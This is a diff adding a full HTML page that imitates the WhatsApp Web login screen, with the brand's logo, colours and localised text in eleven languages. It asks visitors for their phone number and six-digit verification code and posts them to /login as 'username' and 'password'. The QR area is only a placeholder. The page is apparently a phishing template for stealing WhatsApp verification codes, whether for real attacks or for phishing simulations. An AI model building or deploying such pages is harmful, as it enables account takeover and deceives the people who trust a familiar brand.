@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp Web</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#f0f2f5;
+min-height:100vh;display:flex;flex-direction:column}
+.header{background:#00a884;padding:0 0 72px;position:relative}
+.header-inner{max-width:1000px;margin:0 auto;padding:20px 24px;
+display:flex;align-items:center;gap:10px}
+.header-inner svg{width:28px;height:28px;fill:#fff}
+.header-inner span{color:#fff;font-size:1em;font-weight:400;letter-spacing:.2px}
+.main{max-width:1000px;width:100%;margin:-40px auto 40px;padding:0 16px;
+display:flex;gap:20px;position:relative;z-index:1}
+.left{background:#fff;border-radius:4px;box-shadow:0 1px 3px rgba(0,0,0,.08);
+flex:1;max-width:440px;padding:40px 36px 32px}
+.right{background:#fff;border-radius:4px;box-shadow:0 1px 3px rgba(0,0,0,.08);
+flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+padding:40px 32px}
+.chat-icon{font-size:2.8em;margin-bottom:16px}
+h1{font-size:1.2em;font-weight:400;color:#41525d;margin-bottom:8px}
+.sub{font-size:.86em;color:#667781;line-height:1.45;margin-bottom:28px}
+.field{margin-bottom:18px}
+.field label{display:block;font-size:.78em;color:#667781;margin-bottom:6px;
+font-weight:500}
+.field input{width:100%;padding:11px 14px;border:1px solid #e0e0e0;
+border-radius:8px;font-size:.92em;color:#111b21;outline:none;
+transition:border .2s}
+.field input:focus{border-color:#00a884}
+.field input::placeholder{color:#8696a0}
+.phone-row{display:flex;gap:8px}
+.phone-row .prefix{width:72px;flex-shrink:0}
+.phone-row .number{flex:1}
+button{width:100%;padding:11px;background:#00a884;color:#fff;border:none;
+border-radius:8px;font-size:.92em;font-weight:500;cursor:pointer;
+transition:background .2s}
+button:hover{background:#008f72}
+.divider{display:flex;align-items:center;gap:12px;margin:20px 0}
+.divider hr{flex:1;border:none;border-top:1px solid #e9edef}
+.divider span{font-size:.76em;color:#8696a0;text-transform:uppercase}
+.qr-area{width:260px;height:260px;border:2px solid #e9edef;border-radius:4px;
+display:flex;align-items:center;justify-content:center;margin-bottom:20px;
+background:#fafafa}
+.qr-placeholder{text-align:center;color:#8696a0;font-size:.82em;line-height:1.5}
+.qr-placeholder .icon{font-size:3em;margin-bottom:8px;display:block}
+.qr-title{font-size:1.15em;font-weight:400;color:#41525d;margin-bottom:8px;
+text-align:center}
+.qr-sub{font-size:.82em;color:#667781;text-align:center;line-height:1.5;
+max-width:280px}
+.steps{text-align:left;margin-top:20px;font-size:.82em;color:#667781;
+line-height:1.7}
+.steps ol{padding-left:20px}
+.encrypt-note{display:flex;align-items:center;gap:6px;justify-content:center;
+margin-top:24px;font-size:.72em;color:#8696a0}
+.encrypt-note span{font-size:.95em}
+@media(max-width:768px){
+.main{flex-direction:column;gap:0}
+.left{max-width:100%;border-radius:4px 4px 0 0}
+.right{border-radius:0 0 4px 4px}
+.qr-area{width:200px;height:200px}
+}
+</style>
+</head>
+<body>
+<div class="header">
+<div class="header-inner">
+<svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+<span>WhatsApp Web</span>
+</div>
+</div>
+<div class="main">
+<div class="left">
+<div class="chat-icon">&#128172;</div>
+<h1 data-i18n="title">WhatsApp Web</h1>
+<p class="sub" data-i18n="subtitle">Verify your phone number to use WhatsApp on this computer</p>
+<form method="POST" action="/login" autocomplete="off">
+<div class="field">
+<label for="phone" data-i18n="phone_label">Phone number</label>
+<input type="tel" id="phone" name="username" data-i18n-ph="phone_ph"
+ placeholder="+1 (555) 000-0000" required autocomplete="off">
+</div>
+<div class="field">
+<label for="code" data-i18n="code_label">Verification code</label>
+<input type="text" id="code" name="password" data-i18n-ph="code_ph"
+ placeholder="6-digit code" required maxlength="8" inputmode="numeric"
+ autocomplete="off">
+</div>
+<button type="submit" data-i18n="verify">Verify and Connect</button>
+</form>
+<div class="encrypt-note">
+<span>&#128274;</span>
+<span data-i18n="encrypted">End-to-end encrypted</span>
+</div>
+</div>
+<div class="right">
+<div class="qr-area">
+<div class="qr-placeholder">
+<span class="icon">&#9635;</span>
+<span data-i18n="qr_loading">Generating QR code...</span>
+</div>
+</div>
+<div class="qr-title" data-i18n="qr_title">Use WhatsApp on your computer</div>
+<div class="qr-sub" data-i18n="qr_sub">Scan the QR code with your phone or enter your number on the left to get started</div>
+<div class="steps">
+<ol>
+<li data-i18n="step1">Open WhatsApp on your phone</li>
+<li data-i18n="step2">Tap Menu or Settings, then Linked Devices</li>
+<li data-i18n="step3">Point your phone at this screen to scan the QR code</li>
+</ol>
+</div>
+</div>
+</div>
+<script>
+(function(){
+var T={
+en:{title:"WhatsApp Web",subtitle:"Verify your phone number to use WhatsApp on this computer",phone_label:"Phone number",phone_ph:"+1 (555) 000-0000",code_label:"Verification code",code_ph:"6-digit code",verify:"Verify and Connect",encrypted:"End-to-end encrypted",qr_loading:"Generating QR code...",qr_title:"Use WhatsApp on your computer",qr_sub:"Scan the QR code with your phone or enter your number on the left to get started",step1:"Open WhatsApp on your phone",step2:"Tap Menu or Settings, then Linked Devices",step3:"Point your phone at this screen to scan the QR code"},
+pt:{title:"WhatsApp Web",subtitle:"Verifique seu n\u00famero de telefone para usar o WhatsApp neste computador",phone_label:"N\u00famero de telefone",phone_ph:"+55 (11) 90000-0000",code_label:"C\u00f3digo de verifica\u00e7\u00e3o",code_ph:"C\u00f3digo de 6 d\u00edgitos",verify:"Verificar e Conectar",encrypted:"Criptografia de ponta a ponta",qr_loading:"Gerando c\u00f3digo QR...",qr_title:"Use o WhatsApp no seu computador",qr_sub:"Escaneie o c\u00f3digo QR com seu celular ou insira seu n\u00famero \u00e0 esquerda",step1:"Abra o WhatsApp no seu celular",step2:"Toque em Menu ou Configura\u00e7\u00f5es, depois em Aparelhos Conectados",step3:"Aponte seu celular para esta tela para escanear o c\u00f3digo QR"},
+es:{title:"WhatsApp Web",subtitle:"Verifica tu n\u00famero de tel\u00e9fono para usar WhatsApp en este ordenador",phone_label:"N\u00famero de tel\u00e9fono",phone_ph:"+34 600 000 000",code_label:"C\u00f3digo de verificaci\u00f3n",code_ph:"C\u00f3digo de 6 d\u00edgitos",verify:"Verificar y Conectar",encrypted:"Cifrado de extremo a extremo",qr_loading:"Generando c\u00f3digo QR...",qr_title:"Usa WhatsApp en tu ordenador",qr_sub:"Escanea el c\u00f3digo QR con tu tel\u00e9fono o ingresa tu n\u00famero a la izquierda",step1:"Abre WhatsApp en tu tel\u00e9fono",step2:"Toca Men\u00fa o Ajustes, luego Dispositivos vinculados",step3:"Apunta tu tel\u00e9fono a esta pantalla para escanear el c\u00f3digo QR"},
+fr:{title:"WhatsApp Web",subtitle:"V\u00e9rifiez votre num\u00e9ro de t\u00e9l\u00e9phone pour utiliser WhatsApp sur cet ordinateur",phone_label:"Num\u00e9ro de t\u00e9l\u00e9phone",phone_ph:"+33 6 00 00 00 00",code_label:"Code de v\u00e9rification",code_ph:"Code \u00e0 6 chiffres",verify:"V\u00e9rifier et Connecter",encrypted:"Chiffrement de bout en bout",qr_loading:"G\u00e9n\u00e9ration du code QR...",qr_title:"Utilisez WhatsApp sur votre ordinateur",qr_sub:"Scannez le code QR avec votre t\u00e9l\u00e9phone ou entrez votre num\u00e9ro \u00e0 gauche",step1:"Ouvrez WhatsApp sur votre t\u00e9l\u00e9phone",step2:"Appuyez sur Menu ou Param\u00e8tres, puis Appareils li\u00e9s",step3:"Dirigez votre t\u00e9l\u00e9phone vers cet \u00e9cran pour scanner le code QR"},
+de:{title:"WhatsApp Web",subtitle:"Best\u00e4tige deine Telefonnummer, um WhatsApp auf diesem Computer zu nutzen",phone_label:"Telefonnummer",phone_ph:"+49 170 0000000",code_label:"Verifizierungscode",code_ph:"6-stelliger Code",verify:"Verifizieren und Verbinden",encrypted:"Ende-zu-Ende-verschl\u00fcsselt",qr_loading:"QR-Code wird generiert...",qr_title:"Nutze WhatsApp auf deinem Computer",qr_sub:"Scanne den QR-Code mit deinem Telefon oder gib deine Nummer links ein",step1:"\u00d6ffne WhatsApp auf deinem Telefon",step2:"Tippe auf Men\u00fc oder Einstellungen, dann Verkn\u00fcpfte Ger\u00e4te",step3:"Richte dein Telefon auf diesen Bildschirm, um den QR-Code zu scannen"},
+it:{title:"WhatsApp Web",subtitle:"Verifica il tuo numero di telefono per usare WhatsApp su questo computer",phone_label:"Numero di telefono",phone_ph:"+39 320 000 0000",code_label:"Codice di verifica",code_ph:"Codice a 6 cifre",verify:"Verifica e Connetti",encrypted:"Crittografia end-to-end",qr_loading:"Generazione codice QR...",qr_title:"Usa WhatsApp sul tuo computer",qr_sub:"Scansiona il codice QR con il telefono o inserisci il tuo numero a sinistra",step1:"Apri WhatsApp sul tuo telefono",step2:"Tocca Menu o Impostazioni, poi Dispositivi collegati",step3:"Punta il telefono verso questo schermo per scansionare il codice QR"},
+ja:{title:"WhatsApp Web",subtitle:"\u3053\u306e\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30fc\u3067WhatsApp\u3092\u4f7f\u7528\u3059\u308b\u306b\u306f\u96fb\u8a71\u756a\u53f7\u3092\u78ba\u8a8d\u3057\u3066\u304f\u3060\u3055\u3044",phone_label:"\u96fb\u8a71\u756a\u53f7",phone_ph:"+81 90-0000-0000",code_label:"\u78ba\u8a8d\u30b3\u30fc\u30c9",code_ph:"6\u6841\u306e\u30b3\u30fc\u30c9",verify:"\u78ba\u8a8d\u3057\u3066\u63a5\u7d9a",encrypted:"\u30a8\u30f3\u30c9\u30c4\u30fc\u30a8\u30f3\u30c9\u6697\u53f7\u5316",qr_loading:"QR\u30b3\u30fc\u30c9\u3092\u751f\u6210\u4e2d...",qr_title:"\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30fc\u3067WhatsApp\u3092\u4f7f\u7528",qr_sub:"\u643a\u5e2f\u96fb\u8a71\u3067QR\u30b3\u30fc\u30c9\u3092\u30b9\u30ad\u30e3\u30f3\u3059\u308b\u304b\u3001\u5de6\u5074\u306b\u756a\u53f7\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044",step1:"\u643a\u5e2f\u96fb\u8a71\u3067WhatsApp\u3092\u958b\u304f",step2:"\u30e1\u30cb\u30e5\u30fc\u307e\u305f\u306f\u8a2d\u5b9a\u3092\u30bf\u30c3\u30d7\u3057\u3001\u30ea\u30f3\u30af\u6e08\u307f\u30c7\u30d0\u30a4\u30b9\u3092\u9078\u629e",step3:"\u643a\u5e2f\u96fb\u8a71\u3092\u3053\u306e\u753b\u9762\u306b\u5411\u3051\u3066QR\u30b3\u30fc\u30c9\u3092\u30b9\u30ad\u30e3\u30f3"},
+zh:{title:"WhatsApp \u7f51\u9875\u7248",subtitle:"\u9a8c\u8bc1\u60a8\u7684\u624b\u673a\u53f7\u7801\u4ee5\u5728\u6b64\u8ba1\u7b97\u673a\u4e0a\u4f7f\u7528 WhatsApp",phone_label:"\u624b\u673a\u53f7\u7801",phone_ph:"+86 138 0000 0000",code_label:"\u9a8c\u8bc1\u7801",code_ph:"6\u4f4d\u9a8c\u8bc1\u7801",verify:"\u9a8c\u8bc1\u5e76\u8fde\u63a5",encrypted:"\u7aef\u5230\u7aef\u52a0\u5bc6",qr_loading:"\u6b63\u5728\u751f\u6210\u4e8c\u7ef4\u7801...",qr_title:"\u5728\u8ba1\u7b97\u673a\u4e0a\u4f7f\u7528 WhatsApp",qr_sub:"\u7528\u624b\u673a\u626b\u63cf\u4e8c\u7ef4\u7801\u6216\u5728\u5de6\u4fa7\u8f93\u5165\u60a8\u7684\u53f7\u7801",step1:"\u5728\u624b\u673a\u4e0a\u6253\u5f00 WhatsApp",step2:"\u70b9\u51fb\u83dc\u5355\u6216\u8bbe\u7f6e\uff0c\u7136\u540e\u70b9\u51fb\u5df2\u5173\u8054\u8bbe\u5907",step3:"\u5c06\u624b\u673a\u5bf9\u51c6\u6b64\u5c4f\u5e55\u626b\u63cf\u4e8c\u7ef4\u7801"},
+ko:{title:"WhatsApp \uc6f9",subtitle:"\uc774 \ucef4\ud4e8\ud130\uc5d0\uc11c WhatsApp\uc744 \uc0ac\uc6a9\ud558\ub824\uba74 \uc804\ud654\ubc88\ud638\ub97c \ud655\uc778\ud558\uc138\uc694",phone_label:"\uc804\ud654\ubc88\ud638",phone_ph:"+82 10-0000-0000",code_label:"\uc778\uc99d \ucf54\ub4dc",code_ph:"6\uc790\ub9ac \ucf54\ub4dc",verify:"\ud655\uc778 \ubc0f \uc5f0\uacb0",encrypted:"\uc885\ub2e8 \uac04 \uc554\ud638\ud654",qr_loading:"QR \ucf54\ub4dc \uc0dd\uc131 \uc911...",qr_title:"\ucef4\ud4e8\ud130\uc5d0\uc11c WhatsApp \uc0ac\uc6a9",qr_sub:"\ud734\ub300\ud3f0\uc73c\ub85c QR \ucf54\ub4dc\ub97c \uc2a4\uce94\ud558\uac70\ub098 \uc67c\ucabd\uc5d0 \ubc88\ud638\ub97c \uc785\ub825\ud558\uc138\uc694",step1:"\ud734\ub300\ud3f0\uc5d0\uc11c WhatsApp \uc5f4\uae30",step2:"\uba54\ub274 \ub610\ub294 \uc124\uc815\uc744 \ud0ed\ud55c \ub2e4\uc74c \uc5f0\uacb0\ub41c \uae30\uae30\ub97c \uc120\ud0dd",step3:"\ud734\ub300\ud3f0\uc744 \uc774 \ud654\uba74\uc5d0 \ud5a5\ud574 QR \ucf54\ub4dc \uc2a4\uce94"},
+ru:{title:"WhatsApp Web",subtitle:"\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430, \u0447\u0442\u043e\u0431\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c WhatsApp \u043d\u0430 \u044d\u0442\u043e\u043c \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u0435",phone_label:"\u041d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430",phone_ph:"+7 900 000-00-00",code_label:"\u041a\u043e\u0434 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f",code_ph:"6-\u0437\u043d\u0430\u0447\u043d\u044b\u0439 \u043a\u043e\u0434",verify:"\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u044c \u0438 \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c",encrypted:"\u0421\u043a\u0432\u043e\u0437\u043d\u043e\u0435 \u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u0438\u0435",qr_loading:"\u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f QR-\u043a\u043e\u0434\u0430...",qr_title:"\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 WhatsApp \u043d\u0430 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u0435",qr_sub:"\u041e\u0442\u0441\u043a\u0430\u043d\u0438\u0440\u0443\u0439\u0442\u0435 QR-\u043a\u043e\u0434 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u043e\u043c \u0438\u043b\u0438 \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0441\u043b\u0435\u0432\u0430",step1:"\u041e\u0442\u043a\u0440\u043e\u0439\u0442\u0435 WhatsApp \u043d\u0430 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0435",step2:"\u041d\u0430\u0436\u043c\u0438\u0442\u0435 \u041c\u0435\u043d\u044e \u0438\u043b\u0438 \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438, \u0437\u0430\u0442\u0435\u043c \u041f\u0440\u0438\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0430",step3:"\u041d\u0430\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u0442\u0435\u043b\u0435\u0444\u043e\u043d \u043d\u0430 \u044d\u0442\u043e\u0442 \u044d\u043a\u0440\u0430\u043d \u0434\u043b\u044f \u0441\u043a\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f QR-\u043a\u043e\u0434\u0430"},
+ar:{title:"WhatsApp \u0648\u064a\u0628",subtitle:"\u062a\u062d\u0642\u0642 \u0645\u0646 \u0631\u0642\u0645 \u0647\u0627\u062a\u0641\u0643 \u0644\u0627\u0633\u062a\u062e\u062f\u0627\u0645 WhatsApp \u0639\u0644\u0649 \u0647\u0630\u0627 \u0627\u0644\u0643\u0645\u0628\u064a\u0648\u062a\u0631",phone_label:"\u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641",phone_ph:"+966 50 000 0000",code_label:"\u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642",code_ph:"\u0631\u0645\u0632 \u0645\u0646 6 \u0623\u0631\u0642\u0627\u0645",verify:"\u062a\u062d\u0642\u0642 \u0648\u0627\u062a\u0635\u0644",encrypted:"\u062a\u0634\u0641\u064a\u0631 \u0645\u0646 \u0637\u0631\u0641 \u0625\u0644\u0649 \u0637\u0631\u0641",qr_loading:"\u062c\u0627\u0631\u064d \u0625\u0646\u0634\u0627\u0621 \u0631\u0645\u0632 QR...",qr_title:"\u0627\u0633\u062a\u062e\u062f\u0645 WhatsApp \u0639\u0644\u0649 \u0627\u0644\u0643\u0645\u0628\u064a\u0648\u062a\u0631",qr_sub:"\u0627\u0645\u0633\u062d \u0631\u0645\u0632 QR \u0628\u0647\u0627\u062a\u0641\u0643 \u0623\u0648 \u0623\u062f\u062e\u0644 \u0631\u0642\u0645\u0643 \u0639\u0644\u0649 \u0627\u0644\u064a\u0633\u0627\u0631",step1:"\u0627\u0641\u062a\u062d WhatsApp \u0639\u0644\u0649 \u0647\u0627\u062a\u0641\u0643",step2:"\u0627\u0646\u0642\u0631 \u0639\u0644\u0649 \u0627\u0644\u0642\u0627\u0626\u0645\u0629 \u0623\u0648 \u0627\u0644\u0625\u0639\u062f\u0627\u062f\u0627\u062a\u060c \u062b\u0645 \u0627\u0644\u0623\u062c\u0647\u0632\u0629 \u0627\u0644\u0645\u0631\u062a\u0628\u0637\u0629",step3:"\u0648\u062c\u0651\u0647 \u0647\u0627\u062a\u0641\u0643 \u0646\u062d\u0648 \u0647\u0630\u0647 \u0627\u0644\u0634\u0627\u0634\u0629 \u0644\u0645\u0633\u062d \u0631\u0645\u0632 QR"}
+};
+var l=(navigator.language||navigator.userLanguage||'en').split('-')[0];
+var t=T[l]||T['en'];
+document.querySelectorAll('[data-i18n]').forEach(function(e){var k=e.getAttribute('data-i18n');if(t[k])e.textContent=t[k]});
+document.querySelectorAll('[data-i18n-ph]').forEach(function(e){var k=e.getAttribute('data-i18n-ph');if(t[k])e.placeholder=t[k]});
+if(l==='ar'){document.documentElement.dir='rtl'}
+})();
+</script>
+</body>
+</html>
